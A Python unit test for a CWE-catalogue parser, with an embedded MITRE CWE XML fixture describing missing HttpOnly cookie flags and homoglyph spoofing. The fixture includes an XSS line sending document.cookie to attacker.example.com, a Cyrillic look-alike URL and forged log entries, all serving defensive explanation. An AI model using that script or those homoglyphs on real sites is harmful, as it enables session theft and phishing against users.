from pathlib import Path
from tempfile import mkdtemp, mkstemp
import zipfile
from application.defs import cre_defs as defs
import unittest
from application import create_app, sqla  # type: ignore
from application.database import db
from unittest.mock import Mock, patch
import os

from application.utils.external_project_parsers.parsers import cwe
from application.prompt_client import prompt_client
import requests


class TestCWEParser(unittest.TestCase):
    def tearDown(self) -> None:
        self.app_context.pop()

    def setUp(self) -> None:
        self.app = create_app(mode="test")
        self.app_context = self.app.app_context()
        self.app_context.push()
        sqla.create_all()
        self.collection = db.Node_collection()

    @patch.object(requests, "get")
    def test_register_CWE(self, mock_requests) -> None:
        tmpdir = mkdtemp()
        tmpFile = os.path.join(tmpdir, "cwe.xml")
        tmpzip = os.path.join(tmpdir, "cwe.zip")
        with open(tmpFile, "w") as cx:
            cx.write(self.CWE_xml)
        with zipfile.ZipFile(tmpzip, "w", zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(tmpFile, arcname="cwe.xml")

        class fakeRequest:
            def iter_content(self, chunk_size=None):
                zipdata = ""
                with open(tmpzip, "rb") as zipf:
                    zipdata = zipf.read()
                return [zipdata]

        mock_requests.return_value = fakeRequest()
        cres = []
        for cid in [276, 285, 434, 632, 732, 733, 451]:
            cre = defs.CRE(id=f"{cid}-{cid}", name=f"CRE-{cid}")
            cres.append(cre)
            dbcre = self.collection.add_cre(cre=cre)
            dbcapec = self.collection.add_node(
                defs.Standard(name="CAPEC", sectionID=cid)
            )  # test link to capec
            dbcwe = self.collection.add_node(
                defs.Standard(name="CWE", sectionID=cid)
            )  # test link to related weaknesses
            self.collection.add_link(dbcre, dbcwe, defs.LinkTypes.LinkedTo)
            self.collection.add_link(dbcre, dbcapec, defs.LinkTypes.LinkedTo)

        entries = cwe.CWE().parse(
            cache=self.collection,
            ph=prompt_client.PromptHandler(database=self.collection),
        )
        expected = [
            defs.Standard(
                name="CWE",
                doctype=defs.Credoctypes.Standard,
                links=[
                    defs.Link(document=defs.CRE(name="CRE-732", id="732-732")),
                    defs.Link(document=defs.CRE(name="CRE-733", id="733-733")),
                ],
                hyperlink="https://CWE.mitre.org/data/definitions/1004.html",
                sectionID="1004",
                section="Accessing Functionality Not Properly Constrained by ACLs",
            ),
            defs.Standard(
                name="CWE",
                doctype=defs.Credoctypes.Standard,
                hyperlink="https://CWE.mitre.org/data/definitions/10.html",
                sectionID="1007",
                section="Another CWE",
                links=[
                    defs.Link(document=defs.CRE(name="CRE-451", id="451-451")),
                    defs.Link(document=defs.CRE(name="CRE-632", id="632-632")),
                ],
            ),
        ]
        for name, nodes in entries.results.items():
            self.assertEqual(name, cwe.CWE().name)
            self.assertEqual(len(nodes), 2)
            self.assertCountEqual(nodes[0].todict(), expected[0].todict())
            self.assertCountEqual(nodes[1].todict(), expected[1].todict())

    CWE_xml = """<?xml version="1.0" encoding="UTF-8"?>
<Weakness_Catalog Name="CWE" Version="4.10" Date="2023-01-31" xmlns="http://cwe.mitre.org/cwe-6"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://cwe.mitre.org/cwe-6 http://cwe.mitre.org/data/xsd/cwe_schema_v6.10.xsd"
   xmlns:xhtml="http://www.w3.org/1999/xhtml">
   <Weaknesses>
      <Weakness ID="1004" Name="Sensitive Cookie Without 'HttpOnly' Flag" Abstraction="Variant"
         Structure="Simple" Status="Incomplete">
         <Description>The product uses a cookie to store sensitive information, but the cookie is
            not marked with the HttpOnly flag.</Description>
         <Extended_Description>The HttpOnly flag directs compatible browsers to prevent client-side
            script from accessing cookies. Including the HttpOnly flag in the Set-Cookie HTTP
            response header helps mitigate the risk associated with Cross-Site Scripting (XSS) where
            an attacker's script code might attempt to read the contents of a cookie and exfiltrate
            information obtained. When set, browsers that support the flag will not reveal the
            contents of the cookie to a third party via client-side script executed via XSS.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="732" View_ID="1000" Ordinal="Primary" />
         </Related_Weaknesses>
                  <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="733" View_ID="1000" Ordinal="Primary" />
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined" />
            <Technology Class="Web Based" Prevalence="Undetermined" />
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>An HTTP cookie is a small piece of data attributed to a specific
               website and stored on the user's computer by the user's web browser. This data can be
               leveraged for a variety of purposes including saving information entered into form
               fields, recording user activity, and for authentication purposes. Cookies used to
               save or record information generated by the user are accessed and modified by script
               code embedded in a web page. While cookies used for authentication are created by the
               website's server and sent to the user to be attached to future requests. These
               authentication cookies are often not meant to be accessed by the web page sent to the
               user, and are instead just supposed to be attached to future requests to verify
               authentication details.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>If the HttpOnly flag is not set, then sensitive information stored in the
                  cookie may be exposed to unintended parties.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>If the cookie in question is an authentication cookie, then not setting the
                  HttpOnly flag may allow an adversary to steal authentication data (e.g., a session
                  ID) and assume the identity of the user.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Leverage the HttpOnly flag when setting a sensitive cookie in a
                  response.</Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>While this mitigation is effective for protecting cookies from a
                  browser's own scripting engine, third-party components or plugins may have their
                  own engines that allow access to cookies. Attackers might also be able to use
                  XMLHTTPResponse to read the headers directly and obtain the cookie.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In this example, a cookie is used to store a session ID for a client's
                  interaction with a website. The intention is that the cookie will be sent to the
                  website with each request made by the client.</Intro_Text>
               <Body_Text>The snippet of code below establishes a new cookie to hold the sessionID.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String sessionID = generateSessionId();<xhtml:br />Cookie c = new
                     Cookie("session_id", sessionID);<xhtml:br />response.addCookie(c);</xhtml:div>
               </Example_Code>
               <Body_Text>The HttpOnly flag is not set for the cookie. An attacker who can perform
                  XSS could insert malicious script such as:</Body_Text>
               <Example_Code Nature="Attack" Language="JavaScript">
                  <xhtml:div>document.write('&lt;img
                     src="http://attacker.example.com/collect-cookies?cookie=' + document.cookie .
                     '"&gt;'</xhtml:div>
               </Example_Code>
               <Body_Text>When the client loads and executes this script, it makes a request to the
                  attacker-controlled web site. The attacker can then log the request and steal the
                  cookie.</Body_Text>
               <Body_Text>To mitigate the risk, use the setHttpOnly(true) method.</Body_Text>
               <Example_Code Nature="Good" Language="Java">
                  <xhtml:div>String sessionID = generateSessionId();<xhtml:br />Cookie c = new
                     Cookie("session_id", sessionID);<xhtml:br />c.setHttpOnly(true);<xhtml:br />
                     response.addCookie(c);</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2014-3852</Reference>
               <Description>CMS written in Python does not include the HTTPOnly flag in a Set-Cookie
                  header, allowing remote attackers to obtain potentially sensitive information via
                  script access to this cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2014-3852</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2015-4138</Reference>
               <Description>Appliance for managing encrypted communications does not use HttpOnly
                  flag.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2015-4138</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-2" />
            <Reference External_Reference_ID="REF-3" />
            <Reference External_Reference_ID="REF-4" />
            <Reference External_Reference_ID="REF-5" />
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2017-01-02</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2020-02-24</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2021-10-28</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2023-01-31</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="1007" Name="Insufficient Visual Distinction of Homoglyphs Presented to User"
         Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product displays information or identifiers to a user, but the display
            mechanism does not make it easy for the user to distinguish between visually similar or
            identical glyphs (homoglyphs), which may cause the user to misinterpret a glyph and
            perform an unintended, insecure action.</Description>
         <Extended_Description>
            <xhtml:p>Some glyphs, pictures, or icons can be semantically distinct to a program,
               while appearing very similar or identical to a human user. These are referred to as
               homoglyphs. For example, the lowercase "l" (ell) and uppercase "I" (eye) have
               different character codes, but these characters can be displayed in exactly the same
               way to a user, depending on the font. This can also occur between different character
               sets. For example, the Latin capital letter "A" and the Greek capital letter "Α"
               (Alpha) are treated as distinct by programs, but may be displayed in exactly the same
               way to a user. Accent marks may also cause letters to appear very similar, such as
               the Latin capital letter grave mark "À" and its equivalent "Á" with the acute accent.</xhtml:p>
            <xhtml:p>Adversaries can exploit this visual similarity for attacks such as phishing,
               e.g. by providing a link to an attacker-controlled hostname that looks like a
               hostname that the victim trusts. In a different use of homoglyphs, an adversary may
               create a back door username that is visually similar to the username of a regular
               user, which then makes it more difficult for a system administrator to detect the
               malicious username while reviewing logs.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="451" View_ID="1000" Ordinal="Primary" />
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined" />
            <Technology Class="Web Based" Prevalence="Sometimes" />
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Homograph Attack</Term>
               <Description>"Homograph" is often used as a synonym of "homoglyph" by researchers,
                  but according to Wikipedia, a homograph is a word that has multiple, distinct
                  meanings.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>This weakness may occur when characters from various character sets are allowed
                  to be interchanged within a URL, username, email address, etc. without any
                  notification to the user or underlying system being used.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
               <Note>An attacker may ultimately redirect a user to a malicious website, by deceiving
                  the user into believing the URL they are accessing is a trusted domain. However,
                  the attack can also be used to forge log entries by using homoglyphs in usernames.
                  Homoglyph manipulations are often the first step towards executing advanced
                  attacks such as stealing a user's credentials, Cross-Site Scripting (XSS), or log
                  forgery. If an attacker redirects a user to a malicious site, the attacker can
                  mimic a trusted domain to steal account credentials and perform actions on behalf
                  of the user, without the user's knowledge. Similarly, an attacker could create a
                  username for a website that contains homoglyph characters, making it difficult for
                  an admin to review logs and determine which users performed which actions.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Manual Dynamic Analysis</Method>
               <Description>If utilizing user accounts, attempt to submit a username that contains
                  homoglyphs. Similarly, check to see if links containing homoglyphs can be sent via
                  email, web browsers, or other mechanisms.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Use a browser that displays Punycode for IDNs in the URL and status bars,
                     or which color code various scripts in URLs.</xhtml:p>
                  <xhtml:p>Due to the prominence of homoglyph attacks, several browsers now help
                     safeguard against this attack via the use of Punycode. For example, Mozilla
                     Firefox and Google Chrome will display IDNs as Punycode if top-level domains do
                     not restrict which characters can be used in domain names or if labels mix
                     scripts for different languages.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Use an email client that has strict filters and prevents messages that
                     mix character sets to end up in a user's inbox.</xhtml:p>
                  <xhtml:p>Certain email clients such as Google's GMail prevent the use of non-Latin
                     characters in email addresses or in links contained within emails. This helps
                     prevent homoglyph attacks by flagging these emails and redirecting them to a
                     user's spam folder.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following looks like a simple, trusted URL that a user may frequently
                  access.</Intro_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>http://www.еxаmрlе.соm</xhtml:div>
               </Example_Code>
               <Body_Text>However, the URL above is comprised of Cyrillic characters that look
                  identical to the expected ASCII characters. This results in most users not being
                  able to distinguish between the two and assuming that the above URL is trusted and
                  safe. The "e" is actually the "CYRILLIC SMALL LETTER IE" which is represented in
                  HTML as the character &amp;#x435, while the "a" is actually the "CYRILLIC SMALL
                  LETTER A" which is represented in HTML as the character &amp;#x430. The "p", "c",
                  and "o" are also Cyrillic characters in this example. Viewing the source reveals a
                  URL of
                  "http://www.&amp;#x435;x&amp;#x430;m&amp;#x440;l&amp;#x435;.&amp;#x441;&amp;#x43e;m".
                  An adversary can utilize this approach to perform an attack such as a phishing
                  attack in order to drive traffic to a malicious website.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following displays an example of how creating usernames containing
                  homoglyphs can lead to log forgery.</Intro_Text>
               <Body_Text>Assume an adversary visits a legitimate, trusted domain and creates an
                  account named "admin", except the 'a' and 'i' characters are Cyrillic characters
                  instead of the expected ASCII. Any actions the adversary performs will be saved to
                  the log file and look like they came from a legitimate administrator account.</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>123.123.123.123 аdmіn [17/Jul/2017:09:05:49 -0400] "GET
                     /example/users/userlist HTTP/1.1" 401 12846<xhtml:br /> 123.123.123.123 аdmіn
                     [17/Jul/2017:09:06:51 -0400] "GET /example/users/userlist HTTP/1.1" 200 4523<xhtml:br />
                     123.123.123.123 admin [17/Jul/2017:09:10:02 -0400] "GET
                     /example/users/editusers HTTP/1.1" 200 6291<xhtml:br /> 123.123.123.123 аdmіn
                     [17/Jul/2017:09:10:02 -0400] "GET /example/users/editusers HTTP/1.1" 200 6291<xhtml:br />
                  </xhtml:div>
               </Example_Code>
               <Body_Text>Upon closer inspection, the account that generated three of these log
                  entries is "&amp;#x430;dm&amp;#x456;n". Only the third log entry is by the
                  legitimate admin account. This makes it more difficult to determine which actions
                  were performed by the adversary and which actions were executed by the legitimate
                  "admin" account.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2013-7236</Reference>
               <Description>web forum allows impersonation of users with homoglyphs in account names</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2013-7236</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-0584</Reference>
               <Description>Improper character restriction in URLs in web browser</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-0584</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0652</Reference>
               <Description>Incomplete denylist does not include homoglyphs of "/" and "?"
                  characters in URLs</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0652</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-5015</Reference>
               <Description>web browser does not convert hyphens to punycode, allowing IDN spoofing
                  in URLs</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-5015</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0233</Reference>
               <Description>homoglyph spoofing using punycode in URLs and certificates</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0233</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0234</Reference>
               <Description>homoglyph spoofing using punycode in URLs and certificates</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0234</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0235</Reference>
               <Description>homoglyph spoofing using punycode in URLs and certificates</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0235</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="632" />
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7"
               Section="Chapter 11, &#34;Canonical Representation Issues&#34;, Page 382" />
            <Reference External_Reference_ID="REF-8" />
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2017-07-24</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2019-01-03</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description,
                  Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2020-02-24</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2020-06-25</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2022-10-13</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2023-01-31</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description,
                  Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
   </Weaknesses>
</Weakness_Catalog>"""
